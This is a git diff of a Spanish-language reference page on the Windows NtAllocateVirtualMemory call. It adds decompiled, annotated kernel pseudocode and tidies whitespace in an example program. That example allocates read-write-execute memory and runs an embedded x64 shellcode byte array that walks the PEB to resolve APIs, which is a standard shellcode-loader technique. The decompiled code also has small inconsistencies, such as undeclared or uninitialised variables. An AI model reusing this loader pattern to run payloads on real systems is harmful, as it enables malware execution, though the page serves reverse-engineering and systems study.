@@ -55,7 +55,7 @@ Se debe establecer uno de MEM_COMMIT, MEM_RESET o MEM_RESERVE.
 | MEM_COMMIT             | La región especificada de páginas se va a confirmar.                                                                                                                                                                                                                                                                                                                                                                                                                  |
 | MEM_RESERVE            | La región especificada de las páginas se va a reservar.                                                                                                                                                                                                                                                                                                                                                                                                               |
 | MEM_RESET              | Restablezca el estado de la región especificada para que, si las páginas están en el archivo de paginación, se descartan y se traen páginas de ceros. Si las páginas están en memoria y modificadas, se marcan como no modificadas para que no se escriban en el archivo de paginación. El contenido no está a cero. El parámetro Protect no se usa, pero debe establecerse en un valor válido. Si se establece MEM_RESET, no se puede establecer ninguna otra marca. |
-| Otras marcas (MEM_XXX) | Consulte [VirtualAlloc](../../WinApi/kernelbase.dll/VirtualAlloc.md)                                                                                                                                                                                                                                                                                                                                      |
+| Otras marcas (MEM_XXX) | Consulte [VirtualAlloc](../../WinApi/kernelbase.dll/VirtualAlloc.md)                                                                                                                                                                                                                                                                                                                                                                                                  |
 
 `[in] Protect`
 Máscara de bits que contiene marcas de protección de páginas que especifican la protección deseada para la región confirmada de páginas. En la tabla siguiente se describen estas marcas.
@@ -109,6 +109,127 @@ Cada página del espacio de direcciones virtuales del proceso se encuentra en un
 
 ---
 
+## Implementacion
+
+```c
+NTSTATUS __stdcall NtAllocateVirtualMemory(
+    HANDLE     ProcessHandle,
+    PVOID     *BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T   RegionSize,
+    ULONG     AllocationType,
+    ULONG     Protect
+){
+    uint64_t v8 = 0;                               // r14
+    char PreviousMode;                             // bl
+    int64_t _BaseAddress_;                         // rcx
+    int64_t v11;                                   // rcx
+    PVOID v12;                                     // rdi
+    int64_t v13;                                   // rsi
+    NTSTATUS VirtualMemoryPrepare;                 // ebx // codigo de estado
+
+    uint8_t PreviousModeCurrentThread;     // [rsp+70h] [rbp-138h]
+    uint64_t v17;                          // [rsp+78h] [rbp-130h] BYREF
+    PVOID v18;                                     // [rsp+80h] [rbp-128h] BYREF
+    PVOID v19 = 0;                                 // [rsp+88h] [rbp-120h]
+    ULONG_PTR v20 = 0;                             // [rsp+90h] [rbp-118h]
+    PVOID Object[3];                               // [rsp+98h] [rbp-110h] BYREF
+    int64_t v22[10];                               // [rsp+B0h] [rbp-F8h] BYREF
+    int64_t v23[16];                               // [rsp+100h] [rbp-A8h] BYREF
+    HANDLE _ProcessHandle_ = (int)ProcessHandle;   // [rsp+1B0h] [rbp+8h]
+    ULONG_PTR _ZeroBits_ = ZeroBits;               // [rsp+1C0h] [rbp+18h]
+
+    memset(v22, 0, 0x48);                              // poner la memoria a 0
+    PreviousMode = KeGetCurrentThread()->PreviousMode; // obtener el modo anterior del hilo actual
+    PreviousModeCurrentThread = PreviousMode;
+    if ( PreviousMode )
+    {
+        _BaseAddress_ = (int64_t)BaseAddress;
+
+        if ( (uint64_t)BaseAddress >= 0x7FFFFFFF0000 ) _BaseAddress_ = 0x7FFFFFFF0000;
+        *(_QWORD *)_BaseAddress_ = *(_QWORD *)_BaseAddress_;   // codigo muerto
+        _RegionSize_ = (int64_t)RegionSize;                     
+
+        if ( (uint64_t)RegionSize >= 0x7FFFFFFF0000 ) v11 = 0x7FFFFFFF0000;
+        *(_QWORD *)v11 = *(_QWORD *)v11;                        // codigo muerto
+    }
+    v12 = *BaseAddress;
+    v19 = *BaseAddress;
+    v13 = *RegionSize;
+    v20 = *RegionSize;
+    LODWORD(v22[4]) = AllocationType & 0x7F;
+    if ( (AllocationType & 0x44000) != 0 ) return STATUS_INVALID_PARAMETER; // return 0xc000000d(-1073741811)
+    memset(v23, 0, sizeof(v23));                        
+    v18 = 0;
+    Object[0] = 0;
+    v17 = 0;
+    VirtualMemoryPrepare = MiAllocateVirtualMemoryPrepare(
+                            _ProcessHandle_,
+                            (DWORD)v12,
+                            _ZeroBits_,
+                            v13,
+                            AllocationType & 0xFFFFFF80,
+                            Protect,
+                            (int64_t)v22,
+                            PreviousMode,
+                            0,
+                            0,
+                            0,
+                            (int64_t)v23,
+                            (int64_t)Object);
+    if ( VirtualMemoryPrepare >= 0 )
+    {
+        if ( v22[3] )
+        {
+        if ( v22[3] == -3 )
+        {
+            v8 = 1; // si v8 se pone en 1 ocurrio un STATUS_INVALID_PARAMETER
+            v17 = 1;
+        }
+        else
+        {
+            VirtualMemoryPrepare = PsReferencePartitionByHandle(v22[3], 2, PreviousModeCurrentThread, 1633054029, &v17);
+            v8 = v17;
+            if ( VirtualMemoryPrepare < 0 )
+            goto LABEL_13;
+        }
+        }
+        if ( LOBYTE(v22[6]) == 1 && (AllocationType & (MEM_LARGE_PAGES | MEM_PHYSICAL)) != MEM_PHYSICAL ) // MEM_LARGE_PAGES(0x20000000) | MEM_PHYSICAL(0x00400000)
+        {
+        VirtualMemoryPrepare = STATUS_INVALID_PARAMETER; // VirtualMemoryPrepare = 0xc000000d(-1073741811)
+    LABEL_21:
+            if ( v23[0] )
+                ++dword_140C4E6EC;
+            else
+                ++dword_140C4E6E8;
+            goto LABEL_14;
+            }
+            VirtualMemoryPrepare = MiAllocateVirtualMemory(v23, v8, &v18);
+            if ( VirtualMemoryPrepare >= 0 )
+            {
+            v12 = v18;
+            v19 = v18;
+            v13 = v23[3];
+            v20 = v23[3];
+            }
+        }
+        LABEL_13:
+            if ( VirtualMemoryPrepare < 0 ) goto LABEL_21;
+
+            LABEL_14:
+                if ( v8 >= 2 ) PsDereferencePartition(v8);
+                if ( Object[0] ) ObfDereferenceObjectWithTag(Object[0], 0x6D566D4Du);
+                if ( VirtualMemoryPrepare >= 0 )
+                {
+                    *BaseAddress = v12;
+                    *RegionSize = v13;
+                }
+                return VirtualMemoryPrepare;
+}
+```
+
+---
+
 ### [Example 1](./NtAllocateVirtualMemory/example1.c)
 
 Ejecutar shellcode reservando memoria en el proceso actual con permisos de lectura, escritura y ejecucion
@@ -118,7 +239,7 @@ Ejecutar shellcode reservando memoria en el proceso actual con permisos de lectu
  *
  *  Fuente: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntfreevirtualmemory
  *          https://learn.microsoft.com/es-es/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory
- *  Compila con: gcc example1.c -o example1.exe 
+ *  Compila con: gcc example1.c -o example1.exe
  *
  */
 
@@ -143,7 +264,7 @@ typedef NTSTATUS(NTAPI* NtFreeVirtualMemoryPtr)(
     ULONG   FreeType
 );
 
-static uint8_t code[] =   
+static uint8_t code[] =
     "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
     "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
     "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
@@ -182,7 +303,7 @@ int main() {
 
     PVOID exec = NULL; // ptr a la memoria reservada
     NTSTATUS Status = NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, (PSIZE_T)&size_of_code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    
+
     if (!NT_SUCCESS(Status)) goto exit_free_null;
     printf("ptr NtAllocateVirtualMemory: 0x%p\n", exec);
 
@@ -206,7 +327,7 @@ int main() {
         puts("Error");
         FreeLibrary(hNtdll);
         return EXIT_FAILURE;
-	
+
 }
 ```
 
